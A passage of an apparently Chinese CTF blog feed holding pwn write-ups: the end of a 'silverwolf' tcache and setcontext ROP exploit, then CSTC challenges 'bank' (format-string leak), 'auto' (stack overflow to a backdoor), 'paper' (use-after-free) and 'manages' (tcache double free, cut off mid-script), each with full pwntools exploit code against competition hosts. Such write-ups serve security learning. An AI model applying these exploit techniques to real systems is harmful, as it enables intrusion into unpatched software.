#pause()</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libcbase=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook=libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    environ=libcbase+libc.symbols[&#x27;environ&#x27;]</span><br><span class="line">    opens=libcbase+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">    reads=libcbase+libc.symbols[&#x27;read&#x27;]</span><br><span class="line"></span><br><span class="line">    add(0,120)#0x78</span><br><span class="line">    #pause()</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x68+p64(environ))</span><br><span class="line">    add(0,96)#environ</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">stack = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    #print(hex(stack))</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #pause()</span><br><span class="line">    add_stack=stack-0x120</span><br><span class="line">    print(hex(add_stack))</span><br><span class="line">    add(0,120)#0x78</span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(add_stack))</span><br><span class="line">    add(0,120)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,120)#stack</span><br><span class="line">    show(0)</span><br><span class="line">    #pause()</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    main=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))+0x10</span><br><span class="line">    print(hex(main))</span><br><span class="line">   </span><br><span class="line">    #open(&#x27;./flag&#x27;,0)</span><br><span class="line">  </span><br><span class="line">    orw=p64(pop_rdi+libcbase)+p64(add_stack+0x60)+p64(pop_rsi+libcbase)+p64(0)+p64(opens)</span><br><span class="line">    #read(fd,buf,0x30)</span><br><span class="line">    orw+=p64(pop_rdi+libcbase)+p64(3)+p64(pop_rdx_rsi+libcbase)+p64(0x30)+p64(heapbase+0x10)+p64(reads)+p64(main)+&#x27;./flag\x00\x00&#x27;</span><br><span class="line">    #write(fd,buf,0x30)</span><br><span class="line">    #orw+=p64(pop_rdi+libcbase)+p64(1)+p64(pop_rsi+libcbase)+p64(heapbase+0x10)+p64(pop_rdx+libcbase)+p64(0x30)+&#x27;./flag\x00\x00&#x27;</span><br><span class="line">    print(len(orw))</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    edit(0,orw)</span><br><span class="line"></span><br><span class="line">    add(0,80)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,80)</span><br><span class="line">    add(0,80)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #io.recvuntil(&#x27;\n&#x27;,timeout=10000000)</span><br><span class="line">    show(0)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">                           </span><br></pre></td></tr></table></figure><p>看了<a href="https://ctf.njupt.edu.cn/613.html#silverwolf">南邮师傅们的博客</a>复现了一下,思路主要是，将rop写在堆上，用setcontext函数设置rsp的值也就是栈顶的地址，将栈转移到堆上，执行rop。</p><p>正确exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">f-rom pwn import*</span><br><span class="line">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def menu(ch):</span><br><span class="line">    p.sendlineafter(&#x27;choice:&#x27;,str(ch))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">def edit(content):</span><br><span class="line">    menu(2)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Content:&#x27;,content)</span><br><span class="line">def show():</span><br><span class="line">    menu(3)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">def free():</span><br><span class="line">    menu(4)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">#p = process(&#x27;./silverwolf&#x27;)</span><br><span class="line">#elf = ELF(&#x27;./silverwolf&#x27;)</span><br><span class="line">#libc = elf.libc</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x78)</span><br><span class="line">    edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">#pause()</span><br><span class="line">for i in range(2):</span><br><span class="line">    edit(&#x27;\x00&#x27;*0x10)</span><br><span class="line">    free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">heap_base = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))  - 0x5B0 - 0x940 - 0x70</span><br><span class="line">log.info(&#x27;HEAP:\t&#x27; + hex(heap_base))</span><br><span class="line">edit(p64(heap_base + 0x10))</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(&#x27;\x00&#x27;*0x23 + &#x27;\x07&#x27;)</span><br><span class="line">#pause()</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(&#x27;\x7F&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - libc.sym[&#x27;__malloc_hook&#x27;] - 0x70</span><br><span class="line">log.info(&#x27;LIBC:\t&#x27; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">edit(&#x27;\x03&#x27;*0x40 + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;]) + &#x27;\x00&#x27;*8*1 + p64(heap_base + 0x4000) + p64(heap_base + 0x3000 + 0x60) + p64(heap_base + 0x1000) + p64(heap_base + 0x10A0) + p64(heap_base + 0x3000))</span><br><span class="line">#pause()</span><br><span class="line">add(0x18)</span><br><span class="line"></span><br><span class="line">                                                                                        ########################</span><br><span class="line">pop_rdi_ret = libc_base + 0x00000000000215BF</span><br><span class="line">pop_rdx_ret = libc_base + 0x0000000000001B96</span><br><span class="line">pop_rax_ret = libc_base + 0x0000000000043AE8</span><br><span class="line">pop_rsi_ret = libc_base + 0x0000000000023EEA</span><br><span class="line">ret = libc_base + 0x00000000000008AA</span><br><span class="line">#pop_rax_ret=0x43a78 + libc_base</span><br><span class="line">#pop_rdx_rsi=0x130889 + libc_base</span><br><span class="line">#pop_rdi_ret=0x2155f + libc_base</span><br><span class="line">#pop_rsi_ret=0x23e8a + libc_base</span><br><span class="line">#pop_rdx_ret=0x1b96 + libc_base</span><br><span class="line"></span><br><span class="line">Open = libc_base + libc.sym[&#x27;open&#x27;]</span><br><span class="line">Read = libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">Write = libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscall = Read + 15</span><br><span class="line">FLAG  = heap_base + 0x4000</span><br><span class="line">gadget = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53</span><br><span class="line"></span><br><span class="line">orw  = p64(pop_rdi_ret) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(Write)</span><br><span class="line"></span><br><span class="line">                                                                                        #############################</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">edit(p64(gadget))</span><br><span class="line">add(0x38)</span><br><span class="line">edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(orw[:0x60])</span><br><span class="line">add(0x48)</span><br><span class="line">edit(orw[0x60:])</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(heap_base + 0x3000) + p64(pop_rdi_ret + 1))</span><br><span class="line">add(0x58)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cstc部分pwn</title>
      <link href="/2021/06/10/cstc%E9%83%A8%E5%88%86pwn/"/>
      <url>/2021/06/10/cstc%E9%83%A8%E5%88%86pwn/</url>
      
        <content type="html"><![CDATA[<p><strong>cstc部分pwn</strong></p><span id="more"></span><h2 id="1-bank"><a href="#1-bank" class="headerlink" title="1.bank"></a>1.bank</h2><p>直接拖入ida分析，password是由fgets函数读取的，因此当生成的第一个随机数为0xa时，密码就会被截断，即为0xa。<br><img src="https://img-blog.csdnimg.cn/20210505211326879.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505211326879.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>可以发现flag被读入栈中，并且有格式化字符串漏洞，经调试后当输入%8$s时即可读出flag。<br><img src="https://img-blog.csdnimg.cn/2021050521154855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2021050521154855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>编写exp时，因需要爆破，所以当读到flag就用sleep()函数来使程序暂停，exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./bank&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10000)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">def exp():</span><br><span class="line">    io.sendlineafter(&#x27;account:\n&#x27;,&#x27;a&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.recvuntil(&#x27;password:\n&#x27;)</span><br><span class="line">    payload = &#x27;&#x27;</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    res = io.recv(2)</span><br><span class="line">    io.sendlineafter(&#x27;balance?\n&#x27;,&#x27;yes&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendlineafter(&#x27;code: \n&#x27;,&#x27;%8$s&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Your input is: &#x27;)</span><br><span class="line">    res=io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">    if res==&#x27;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        sleep(10)</span><br><span class="line">i=0</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">#exp()</span><br><span class="line">while(i!=100):</span><br><span class="line">    try:</span><br><span class="line">        io = remote(&#x27;81.70.195.166&#x27;,10000)</span><br><span class="line">        exp()</span><br><span class="line">        print(res)</span><br><span class="line">        i+=1</span><br><span class="line">    except:</span><br><span class="line">        i+=1</span><br><span class="line">        print(res)</span><br><span class="line">        io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-auto"><a href="#2-auto" class="headerlink" title="2.auto"></a>2.auto</h2><p>托入ida分析后发现一大堆重复函数，导致不能反汇编，因此我们需要通过patch来跳过这些重复函数。patch方法如下所示。<br><img src="https://img-blog.csdnimg.cn/20210505212613722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505212613722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>patch结束后再反汇编得到伪代码如下所示。<br><img src="https://img-blog.csdnimg.cn/20210505212712638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505212712638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>此时代码逻辑就变得很简单，<code>complex_functin</code>函数为加密函数，编写解密脚本使其进入<code>aas</code>中的<code>login</code>，脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a2=0</span><br><span class="line">a=&quot;UCIJEURI&quot;</span><br><span class="line">key=[]</span><br><span class="line">for a2 in range(8):</span><br><span class="line">    for a1 in range(65,91):</span><br><span class="line">        if ord(a[a2])==(5 * a2 + a1 - 65) % 26 + 65:</span><br><span class="line">            key.append(chr(a1))</span><br><span class="line">            print(a2)</span><br><span class="line">            break</span><br><span class="line">print(&#x27;&#x27;.join(key))</span><br></pre></td></tr></table></figure><p><code>login</code>函数如下所示，可以发现scanf函数没有限制长度，因此可以输入任意长度造成栈溢出，将返回地址改写到后门函数，拿到shell<br><img src="https://img-blog.csdnimg.cn/20210505213038612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505213038612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10001)</span><br><span class="line">#io = process(&#x27;./auto&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">io.recvuntil(&#x27;password: \n&#x27;)</span><br><span class="line">back = 0x8048665</span><br><span class="line">payload = &#x27;UXYUKVNZ&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;again: \n&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;*(0x48+4)+p32(back)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-paper"><a href="#3-paper" class="headerlink" title="3.paper"></a>3.paper</h2><p>给了libc，先确定libc版本，可以直接<code>./libc.so.6</code>查看版本，也可以通过<a href="https://libc.blukat.me/?q=puts:6a0,gets:d90">在线网站</a>利用中两个函数的偏移确定版本，发现是libc-2.23。</p><p>分析各个函数作用，发现free后指针未置0存在uaf漏洞<br><img src="https://img-blog.csdnimg.cn/20210505213839410.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505213839410.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>这两个函数一个泄露了栈地址，另一个是修改栈地址<br><img src="https://img-blog.csdnimg.cn/2021050521393840.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2021050521393840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>然后发现有后门函数，且v9在被泄露地址的变量的下方<br><img src="https://img-blog.csdnimg.cn/20210505214102660.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505214102660.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>因此我们可以改变v9的值来拿shell，现在我们利用uaf漏洞，先申请一个chunk，再释放。又因为free后指针没有置0，我们可以利用第三个函数来改写fd指针。<br><img src="https://img-blog.csdnimg.cn/20210505214338171.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505214338171.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>改写fd指针为目标地址后再连续申请两次chunk即可得到我们的目标chunk。现在还缺一个目标地址，利用第4个函数泄露出栈地址，再用第5个函数改写栈地址为0x21（fastbin会检查size域），然后申请两次chunk即可改写v9的值。</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./paper&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10003)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">def add():</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;1 &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Index:\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index:\n&#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;word count:\n&#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def move(a1):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;5 &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Which disk?\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add()#0</span><br><span class="line">    add()#1</span><br><span class="line">    dele(0)</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;at: &#x27;)</span><br><span class="line">    stack = int(io.recv(14),16)</span><br><span class="line">    print(hex(stack))</span><br><span class="line">    move(33 )</span><br><span class="line">    edit(0,stack-8)</span><br><span class="line">    add()#2</span><br><span class="line">    add()#3</span><br><span class="line">    edit(3,3435973836)</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;6 &#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="5-manages"><a href="#5-manages" class="headerlink" title="5.manages"></a>5.manages</h2><p>libc版本为2.27<br>思路是先泄露heapbase以控制tcache，再泄露libc_base，然后打__free_hook。</p><p>free后指针未置0。<br><img src="https://img-blog.csdnimg.cn/20210505215230337.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505215230337.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>这个<code>change_summary</code>函数的作用是free掉*(bookcase[v1]),并申请一个chunk进行替换。<br><img src="https://img-blog.csdnimg.cn/20210505215336785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210505215336785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>通过此操作可以泄露处heapbase</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(8,&#x27;0&#x27;,0x89,&#x27;0&#x27;)#0</span><br><span class="line">add(8,&#x27;1&#x27;,0x89,&#x27;1&#x27;)#1</span><br><span class="line">edit(0,0x18,&#x27;&#x27;)</span><br><span class="line">edit(1,0x18,&#x27;&#x27;)</span><br><span class="line">edit(1,0x90,&#x27;&#x27;)</span><br><span class="line">show(1)</span><br></pre></td></tr></table></figure><p>泄露出heapbase后利用doublefree以申请到tcache来控制tcache，然后将0x250对应的counts改为&gt;7的数，再free掉tcache以获得libcbase的基地址。</p><p>exp如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./managebooks&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10004)</span><br><span class="line">libc = ELF(&#x27;./libc1.so.6&#x27;)</span><br><span class="line">def add(a1,a2,a3,a4):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;size: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book name: &#x27;,a2)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,str(a3)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book summary: &#x27;,a4)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2,a3):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book summary: &#x27;,a3)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; 